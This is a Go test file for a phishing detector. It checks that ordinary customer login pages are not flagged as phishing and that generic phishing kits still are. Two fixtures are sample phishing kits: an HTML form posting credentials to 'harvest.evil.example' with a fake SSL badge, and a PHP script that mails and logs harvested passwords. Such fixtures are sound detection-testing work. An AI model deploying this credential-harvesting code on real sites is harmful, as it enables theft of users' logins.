package checks

import (
	"os"
	"path/filepath"
	"strings"
	"testing"
)

// CHK-P04: the "Generic Login" pseudo-brand matches ubiquitous titles like
// "Sign In", worth +3 toward the phishing score. A single equally-ubiquitous
// JS token (window.location.href, fetch()) then pushed a customer's own login
// page over the Critical threshold, mislabelling it phishing_page /
// phishing_php. The generic pseudo-brand must require multiple independent
// signals (a higher score floor) before flagging, so plain login pages that a
// real brand or strong exfil signal would never resemble are left alone.

// A plain customer login page: generic "Sign In" title, a relative
// same-origin form action, and the window.location redirect every login uses.
// It must NOT flag.
const plainCustomerLoginHTML = `<!DOCTYPE html>
<html>
<head>
<title>Sign In - Acme Intranet</title>
<style>body{font-family:Arial;background:#f4f4f4}.card{max-width:360px;margin:0 auto}</style>
</head>
<body>
<div class="card">
<h1>Sign in to your account</h1>
<form action="/session" method="post">
<input type="email" name="email" placeholder="you@acme.example">
<input type="password" name="password">
<button type="submit">Sign in</button>
</form>
</div>
<script>
document.querySelector('form').addEventListener('submit', function(){
  window.location.href = '/dashboard';
});
</script>
</body>
</html>`

func TestAnalyzeHTMLForPhishingGenericLoginNotFlagged(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "login.html")
	if err := os.WriteFile(path, []byte(plainCustomerLoginHTML), 0600); err != nil {
		t.Fatal(err)
	}
	if res := analyzeHTMLForPhishing(path); res != nil {
		t.Errorf("customer's own plain login page must not flag as phishing, got %+v", res)
	}
}

// A real generic-login phishing kit: same generic title, but it exfiltrates to
// an external host, shows a fake trust badge, and pressures with urgency. That
// is multiple independent strong signals and must still flag.
const genericLoginPhishKitHTML = `<!DOCTYPE html>
<html>
<head>
<title>Secure Access</title>
<style>body{font-family:Arial}</style>
</head>
<body>
<h1>Verify your identity to continue</h1>
<p>Action required: unusual activity detected on your account.</p>
<p>SSL Secured - 256-bit encrypted</p>
<form action="https://harvest.evil.example/collect.php" method="post">
<input type="email" name="email">
<input type="password" name="password">
<button>Sign in</button>
</form>
</body>
</html>`

func TestAnalyzeHTMLForPhishingGenericKitStillFlagged(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "verify.html")
	if err := os.WriteFile(path, []byte(genericLoginPhishKitHTML), 0600); err != nil {
		t.Fatal(err)
	}
	res := analyzeHTMLForPhishing(path)
	if res == nil {
		t.Fatal("real generic-login kit with external exfil + trust badge + urgency must flag")
	}
	if !strings.Contains(strings.ToLower(res.brand), "generic") {
		t.Errorf("brand = %q, want the generic pseudo-brand", res.brand)
	}
}

// A customer's own login.php that posts to itself: reads $_POST credentials
// (normal for a login), generic "Sign In" title, no brand impersonation, no
// exfil. It must NOT flag.
const plainCustomerLoginPHP = `<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $email = $_POST['email'];
    $password = $_POST['password'];
    if (authenticate($email, $password)) {
        header("Location: /dashboard");
        exit;
    }
}
?>
<html>
<head><title>Sign In</title></head>
<body>
<form method="post" action="login.php">
<input type="email" name="email">
<input type="password" name="password">
<button>Sign in</button>
</form>
</body>
</html>`

func TestAnalyzePHPForPhishingGenericLoginNotFlagged(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "login.php")
	if err := os.WriteFile(path, []byte(plainCustomerLoginPHP), 0600); err != nil {
		t.Fatal(err)
	}
	if res := analyzePHPForPhishing(path); res != nil {
		t.Errorf("customer's own login.php must not flag as phishing, got %+v", res)
	}
}

// A real generic-login PHP kit: generic title, reads $_POST creds, mails them
// out and writes them to a results file. Multiple independent signals - must
// still flag.
const genericLoginPhishKitPHP = `<?php
if ($_POST['email']) {
    $em = $_POST['email'];
    $pw = $_POST['password'];
    mail("drop@evil.example", "creds", "email: $em password: $pw");
    file_put_contents("results.txt", "$em:$pw\n", FILE_APPEND);
}
?>
<html>
<head><title>Secure Access</title></head>
<body>
<h1>Verify your identity</h1>
<form method="post">
<input type="email" name="email">
<input type="password" name="password">
<button>Sign in</button>
</form>
</body>
</html>`

func TestAnalyzePHPForPhishingGenericKitStillFlagged(t *testing.T) {
	dir := t.TempDir()
	path := filepath.Join(dir, "share.php")
	if err := os.WriteFile(path, []byte(genericLoginPhishKitPHP), 0600); err != nil {
		t.Fatal(err)
	}
	if res := analyzePHPForPhishing(path); res == nil {
		t.Fatal("real generic-login PHP kit that mails+writes harvested creds must flag")
	}
}
